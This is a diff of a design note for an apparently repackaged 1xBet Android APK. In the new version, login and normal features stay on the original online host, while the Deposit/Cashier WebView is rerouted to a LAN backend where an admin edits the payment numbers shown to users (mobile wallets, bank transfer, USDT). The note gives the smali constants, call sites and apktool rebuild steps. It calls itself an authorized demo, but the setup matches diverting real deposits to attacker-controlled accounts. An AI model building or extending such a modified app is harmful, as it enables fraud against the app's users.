@@ -1,70 +1,90 @@
-# DEMO_BASE_URL — single documented configuration point
+# Demo architecture — ONLINE app + isolated Demo Cashier
 
-**Demo scope:** this APK build is a Demo-only build. It never contacts production
-1xBet hosts, never sends production credentials, and always opens the Demo
-Cashier served by `demo-backend/`. Do not ship this build to production.
+**Scope:** this is an authorized Demo build. The **entire application is ONLINE**
+again exactly as the original build: authentication, configuration, profile,
+navigation and all normal APIs use the original online environment.
 
-## The one place to change it (APK side)
+Only the **Deposit/Cashier flow** uses the isolated Demo Cashier backend
+(`demo-backend/`, synthetic Admin-controlled payment data). No real payment
+provider is contacted by the Demo Cashier. Do not ship this build to
+production.
 
-`smali_classes2/a/wtt.smali` line 39 — static field initializer:
+## Routing
 
-```smali
-.field public static h:Ljava/lang/String; = "http://192.168.100.3:8000"
+```
+APP ──┬──> ORIGINAL ONLINE HOST (La/wtt;->h)          — auth, config, profile,
+      │                                                 normal APIs, WebViews
+      └──> DEMO CASHIER HOST (La/uus;->b)              — Deposit/Cashier only
 ```
 
-`La/wtt;->h` is the **single base URL constant** used by every Demo-relevant
-path:
+## Two host constants (APK side)
+
+### 1. Global ONLINE host — `La/wtt;->h`
+
+`smali_classes2/a/wtt.smali` line 39 — **restored to the original value**, do
+not point it at the Demo backend:
+
+```smali
+.field public static h:Ljava/lang/String; = "https://mob-experience.space"
+```
+
+This is the single global application host. It is consumed by:
 
 | Consumer | Effect |
 |---|---|
-| `La/uus;->a()` (payment host) | Cashier WebView URL = `wtt.h + "/PaymentConsultant/office/payment/requests?set-base-url=v3-api&skip-lang-redirect=1"` (fixed relative path from `La/z360;->b`) |
-| `La/uyg;->getDomainResolverConfig()` | `updateUrl`, `singlUrl`, `apiEndpoint`, `standardUrl` all resolve to `wtt.h` via `sget-object` |
-| `La/egz;->e()` fallback | Safe-domain fallback = `wtt.h` |
-| `La/ak20` (pswitch_17) | API client base URL = `wtt.h` (used by `La/c1f0` service factory) |
-| `La/ham` | API path builder: base = `egz` config (`wtt.h`) + `"/" + path` |
-| `La/mn20` interceptor | With `wtt.h` non-empty and != the old prod literal, the SAFE_DOMAIN rewrite branch is skipped entirely (verified `:cond_4` path) |
+| `La/uyg` domain resolver | `updateUrl`, `singlUrl`, `standardUrl` (original values) |
+| `La/egz` safe-domain helper | fallback / base URL resolution (original logic) |
+| `La/ak20`, `La/ham`, `La/c1f0` | global API client base URL / path builder |
+| `La/mn20` interceptor | SAFE_DOMAIN / test-host selection (original logic) |
+| `La/xhj` interceptor | in-app test/luxury server selector (original logic) |
+| many direct readers (`f8e0`, `kvg`, `pj50`, `rvu`, `scw`, `wyr0`, …) | normal app features |
 
-Old production literal `https://mob-experience.space` is no longer reachable
-from Demo flows; the only remaining occurrences are dead comparisons in the
-interceptor/analytics gates.
+Because `wtt.h` is the ONLINE host again, login (ID/email and Google), the
+main app, profile, config and all normal APIs reach their authorized online
+environment. Do NOT change `wtt.h` to the Demo host.
 
-## Current value
+### 2. Demo Cashier host — `La/uus;->b` (payment only)
 
-* **Demo backend host:** `http://192.168.100.3:8000` — this build's single
-  Demo base URL (LAN IP; the device and the host running `demo-backend/` must
-  be on the same network, and port 8000 must be open on the host firewall).
-* Cleartext HTTP is permitted by the app's existing
-  `res/xml/network_security_config.xml` (`cleartextTrafficPermitted="true"`),
-  so no res changes are needed.
+`smali_classes4/a/uus.smali`:
+
+```smali
+.field private static final b:Ljava/lang/String; = "http://192.168.100.3:8000"
+```
+
+`La/uus` is the **payment host provider**. `La/z360;->F(path)` builds the
+Deposit/Cashier WebView URL as `uus.a() + path`, where the path is the fixed
+constant
+
+```
+/PaymentConsultant/office/payment/requests?set-base-url=v3-api&skip-lang-redirect=1
+```
+
+Every Cashier URL is built via `z360.F()` (call sites: `oq20`, `v360`,
+`bf50`, `f800`), so **only** the Deposit/Cashier flow opens the Demo Cashier
+backend. No other request is routed to it.
 
 ## The demo backend
 
-* Run it: `cd demo-backend && ./run.sh` (binds `0.0.0.0:8000`).
-* Seed DB: created automatically on first run (six synthetic methods —
-  Vodafone `00000000`, Orange, Etisalat, InstaPay, Bank Transfer, USDT TRC20),
-  each with a category (`mobile`/`ewallet`/`bank`/`crypto`) and a
-  `recommended` flag driving the Cashier tabs.
-* Admin (change phone numbers live, no APK rebuild):
-  `http://localhost:8000/admin` — token from `DEMO_ADMIN_TOKEN`
-  (default from `.env.example`).
-* Demo Cashier page: `http://localhost:8000/demo-cashier`.
-  The page shows the same six sections as the original Cashier UI —
-  **Recommended / All systems / Bank transfer / E-wallet / Mobile / Crypto** —
-  as filter tabs (metadata comes from the API; the numbers are always fetched
-  fresh from `GET /api/payment-methods/{method}` when a method is clicked).
-* APK-facing endpoint the WebView opens:
-  `GET /PaymentConsultant/office/payment/requests?...` (described in
-  `demo-backend/app/routers/demo_android.py`).
-* Display numbers come from `GET /api/payment-methods/{method}` and are
-  controlled by the Admin UI (SQLite), e.g. change Vodafone
-  `00000000` → `55555555`, save, then refresh/reopen the Cashier — the new
-  number appears without rebuilding the APK.
-* DB migration: databases created before the category/recommended columns
-  are upgraded in place on first start (`app/db.py`), and seed metadata is
-  backfilled only once — Admin edits are never overwritten by restarts.
+* Run it: `cd demo-backend && ./run.sh` (binds `0.0.0.0:8000`; the APK device
+  and this host must be on the same LAN, port 8000 open).
+* Seed DB: created on first run (six synthetic methods — Vodafone
+  `00000000`, Orange, Etisalat, InstaPay, Bank Transfer, USDT TRC20), each
+  with a category and a `recommended` flag driving the Cashier tabs.
+* Admin (change payment numbers live, no APK rebuild):
+  `http://localhost:8000/admin` — token `DEMO_ADMIN_TOKEN` (default from
+  `.env.example`).
+* Demo Cashier page: `http://localhost:8000/demo-cashier` — same six
+  sections as the original Cashier UI (Recommended / All systems /
+  Bank transfer / E-wallet / Mobile / Crypto).
+* APK-facing endpoint the Cashier WebView opens:
+  `GET /PaymentConsultant/office/payment/requests?...`.
+* Display numbers come from `GET /api/payment-methods/{method}` (Admin
+  controlled, SQLite): change Vodafone in Admin, save, reload Cashier — the
+  new number appears without rebuilding the APK.
 
-## Rebuilding after changing DEMO_BASE_URL
+## Rebuilding after changing a host
 
-Change the single line above, then rebuild the APK (the CI workflow
-`.github/workflows/build.yml` does `apktool b` + sign; trigger it via
-`gh workflow run build.yml --ref <branch>`).
+Change the corresponding constant above, then rebuild the APK:
+`.github/workflows/build.yml` does `apktool b` + sign (trigger via
+`gh workflow run build.yml --ref arena/01a07895-1xbet-my-demo` or push to
+the branch).
